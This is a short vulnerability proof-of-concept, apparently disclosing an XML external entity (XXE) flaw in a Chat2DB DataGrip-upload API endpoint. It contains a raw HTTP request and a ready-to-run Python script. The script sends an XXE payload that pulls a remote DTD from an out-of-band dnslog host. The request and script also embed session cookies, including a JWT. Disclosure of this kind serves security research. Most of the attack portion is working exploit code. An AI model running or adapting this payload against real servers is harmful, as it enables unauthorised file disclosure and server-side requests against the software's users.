POC

```plain
POST /api/converter/datagrip/upload?text=%23DataSourceSettings%23 HTTP/1.1
Host: 0.0.0.0:10824
Content-Length: 0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: application/json
Content-Type: application/json
Origin: http://0.0.0.0:10824
Referer: http://0.0.0.0:10824/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: csrftoken=3HulKimOvfdNVsoKTa9Uh3e58AJf2uPA7aPx9AMXgWkrA2tU62UVfPnq6DrGTThR; _ga=GA1.1.507760079.1732502327; CHAT2DB=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpblR5cGUiOiJsb2dpbiIsImxvZ2luSWQiOjIsImRldmljZSI6ImRlZmF1bHQtZGV2aWNlIiwiZWZmIjoxNzM1MjE4MTIxNzA4LCJyblN0ciI6Im15UDlvQU85Z1B2eER0WU1sY3V2V0dzRWs5SHkwUnNQIn0.-gD5bab1rvixzUxEbIRhdFsA7t8ApTPAKvblltiw3Ro; CHAT2DB.USER_ID=2; _ga_V8M4E5SF61=GS1.1.1732626111.3.1.1732626132.0.0.0
Connection: close


```



and u can using the python script。replace the dnslog address of "<font style="color:rgb(33, 37, 41);">eavdrc.dnslog.cn"</font>

```plain
import requests

payload = '''#DataSourceSettings#\n#BEGIN#\n<!DOCTYPE ANY[ <!ENTITY % remote SYSTEM "http://eavdrc.dnslog.cn/attack.xml"> %remote; ]> <root></root>'''
url = "http://0.0.0.0:10824/api/converter/datagrip/upload?text={}".format(payload)
from urllib.parse import quote
encoded_url = quote(url, safe='/:?&=')
cookies = {"csrftoken": "3HulKimOvfdNVsoKTa9Uh3e58AJf2uPA7aPx9AMXgWkrA2tU62UVfPnq6DrGTThR", "_ga": "GA1.1.507760079.1732502327", "CHAT2DB": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpblR5cGUiOiJsb2dpbiIsImxvZ2luSWQiOjIsImRldmljZSI6ImRlZmF1bHQtZGV2aWNlIiwiZWZmIjoxNzM1MjE4MTIxNzA4LCJyblN0ciI6Im15UDlvQU85Z1B2eER0WU1sY3V2V0dzRWs5SHkwUnNQIn0.-gD5bab1rvixzUxEbIRhdFsA7t8ApTPAKvblltiw3Ro", "CHAT2DB.USER_ID": "2", "_ga_V8M4E5SF61": "GS1.1.1732626111.3.1.1732626132.0.0.0"}
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36", "Accept": "application/json", "Content-Type": "application/json", "Origin": "http://0.0.0.0:10824", "Referer": "http://0.0.0.0:10824/dashboard", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
res = requests.post(encoded_url, headers=headers, cookies=cookies)
print(res.text)
```

when u execute the python script ,u will see the dnslog plaform can re

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732633551408-04a40750-4754-409d-b87e-83ea69137eb5.png)

code analysis

in the attack endpoint for <font style="color:#d1d5da;background-color:#24292e;">/datagrip/upload </font>

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732627825407-1c72e190-c6d3-4ffb-90f4-ab22a7936f01.png)

![](https://cdn.nlark.com/yuque/0/2024/png/2897054/1732627676622-d88a0c34-3111-49e3-82db-b66b8dce9400.png)

